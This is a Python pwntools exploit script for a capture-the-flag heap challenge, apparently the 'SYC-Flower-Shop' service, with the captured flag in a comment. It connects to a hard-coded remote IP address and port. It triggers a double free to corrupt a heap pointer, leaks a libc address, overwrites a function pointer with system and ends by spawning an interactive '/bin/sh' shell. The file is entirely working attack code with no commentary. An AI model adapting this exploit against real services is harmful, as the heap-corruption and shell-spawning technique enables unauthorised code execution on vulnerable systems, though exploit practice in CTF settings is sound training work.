#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwnpwnpwn import *
from pwn import *
import time
#host = "10.211.55.23"
#port = 8888
# SCTF{Have_Fun_WITH_unlink}

host = "58.213.63.30"
port = 61112

r = remote(host,port)

def buy(size):
    r.recvuntil("Exit")
    r.sendline("1")
    r.recvuntil(":")
    r.sendline(str(size))

def show(idx):
    r.recvuntil("Exit")
    r.sendline("2")
    r.recvuntil(":")
    r.sendline(str(idx))
    data = r.recvuntil("SYC-Flower-Shop")
    return data

def remove(idx):
    r.recvuntil("Exit")
    r.sendline("4")
    r.recvuntil(":")
    r.sendline(str(idx))

def edit(idx,data):
    r.recvuntil("Exit")
    r.sendline("3")
    r.recvuntil(":")
    r.sendline(str(idx))
    r.recvuntil(":")
    r.sendline(data)

chunk = 0x8049ca8
chunk2 = 0x8049cb8
buy(20)
buy(20)
remove(1)
remove(0)
remove(1)
buy(20)
edit(2,p32(chunk))
buy(20)
buy(20)
buy(20)
edit(5,"a"*(0x60-1)) 
data = show(5)
read =  u32(data.split()[1][4:8])
libc = read - 0x000dabd0
print "libc : ",hex(libc)
system = libc + 0x00040190
payload = "/bin/sh;".ljust(0x64,"b")
payload += p32(read)
payload += p32(system)
edit(5,payload)
remove(5)
r.interactive()
